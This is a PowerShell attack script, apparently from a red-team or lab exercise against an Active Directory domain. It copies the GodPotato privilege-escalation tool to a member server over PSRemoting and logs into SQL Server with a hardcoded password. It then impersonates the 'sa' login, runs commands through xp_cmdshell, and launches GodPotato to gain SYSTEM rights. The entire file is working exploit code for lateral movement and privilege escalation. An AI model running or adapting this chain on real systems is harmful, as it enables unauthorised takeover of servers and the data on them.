[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$Server = "192.168.77.22",
    [Parameter(Mandatory=$false)]
    [string]$ServerFqdn = "mbr01.child.cadre.local",
    [Parameter(Mandatory=$false)]
    [string]$Username = "child.cadre.local\analyst_t1",
    [Parameter(Mandatory=$false)]
    [string]$Password = "T13r_An@lyst!",
    [Parameter(Mandatory=$false)]
    [string]$ToolSource = "C:\Tools\ADTools",
    [Parameter(Mandatory=$false)]
    [string]$GpPath = "C:\Users\Public\cadre-gp.exe"
)
$ErrorActionPreference = "Stop"

$securePass = ConvertTo-SecureString $Password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($Username, $securePass)

# Stage GodPotato from ws01 beachhead to mbr01 via PSRemoting (MITRE T1570).
# analyst_t1 is in Remote Management Users, not Administrators, so C$ is blocked;
# Copy-Item -ToSession over the WinRM session works without admin rights.
$src = Join-Path $ToolSource "GodPotato-NET4.exe"
if (-not (Test-Path $src)) {
    $alt = Get-ChildItem $ToolSource -Filter "GodPotato*.exe" | Select-Object -First 1
    if ($alt) { $src = $alt.FullName }
}
if (-not (Test-Path $src)) { throw "GodPotato binary not found in $ToolSource" }

$sess = New-PSSession -ComputerName $Server -Credential $cred -Port 5985 -ErrorAction Stop
try {
    Invoke-Command -Session $sess -ScriptBlock {
        $f = "C:\Users\Public\cadre-gp.exe"
        if (Test-Path $f) { Remove-Item $f -Force }
    }
    Copy-Item -Path $src -Destination $GpPath -ToSession $sess -Force
    $info = Invoke-Command -Session $sess -ScriptBlock { param($p) Get-Item $p; icacls $p /grant "Everyone:(RX)" | Out-Null; Get-Item $p } -ArgumentList $GpPath
    Write-Output "STAGED: $src -> $GpPath ($($info.Length) bytes)"
} finally {
    Remove-PSSession -Session $sess -ErrorAction SilentlyContinue
}

$connStr = "Server=$Server;Database=master;Integrated Security=false;User ID=analyst_t1;Password=$Password;TrustServerCertificate=True;"

try {
    Add-Type -AssemblyName System.Data
    $conn = New-Object System.Data.SqlClient.SqlConnection($connStr)
    $conn.Open()
    Write-Output "SQL_OK: connected to $Server as analyst_t1"

    $cmd = $conn.CreateCommand()
    $cmd.CommandText = "EXECUTE AS LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER('sysadmin'); REVERT"
    $isSysadmin = $cmd.ExecuteScalar()
    Write-Output "sysadmin_membership=$isSysadmin"

    function Invoke-SqlCmd($sql) {
        $c = $conn.CreateCommand()
        $c.CommandText = "EXECUTE AS LOGIN = 'sa'; $sql; REVERT"
        $c.ExecuteNonQuery() | Out-Null
    }

    function Invoke-SqlReader($sql) {
        $c = $conn.CreateCommand()
        $c.CommandText = "EXECUTE AS LOGIN = 'sa'; $sql; REVERT"
        $reader = $c.ExecuteReader()
        $out = @()
        while ($reader.Read()) {
            if ($reader.IsDBNull(0)) { continue }
            $out += $reader.GetString(0)
        }
        $reader.Close()
        return $out
    }

    $r = Invoke-SqlReader "EXEC master..xp_cmdshell 'whoami'"
    $r | ForEach-Object { Write-Output "xp_cmdshell: $_" }

    $priv = Invoke-SqlReader "EXEC master..xp_cmdshell 'whoami /priv | findstr SeImpersonatePrivilege'"
    $priv | ForEach-Object { Write-Output "priv: $_" }

    $cmdPath = "C:\Users\Public\cadre-gp.cmd"
    Invoke-SqlCmd "EXEC master..xp_cmdshell 'echo cmd /c whoami > $cmdPath'"

    $check = Invoke-SqlReader "EXEC master..xp_cmdshell 'if exist $GpPath (echo EXISTS) else (echo MISSING)'"
    $check | ForEach-Object { Write-Output "check: $_" }

    $sys = Invoke-SqlReader "EXEC master..xp_cmdshell '$GpPath -cmd $cmdPath'"
    $sys | ForEach-Object { Write-Output "godpotato: $_" }

    if ($sys -match 'nt authority\system') {
        Write-Output "T043_OK: SYSTEM on mbr01 via SQL impersonation + GodPotato"
    } else {
        Write-Output "T043_INFO: GodPotato completed; verify output above"
    }

    $conn.Close()
} catch {
    Write-Output "SQL_FAIL: $($_.Exception.Message)"
    exit 1
}
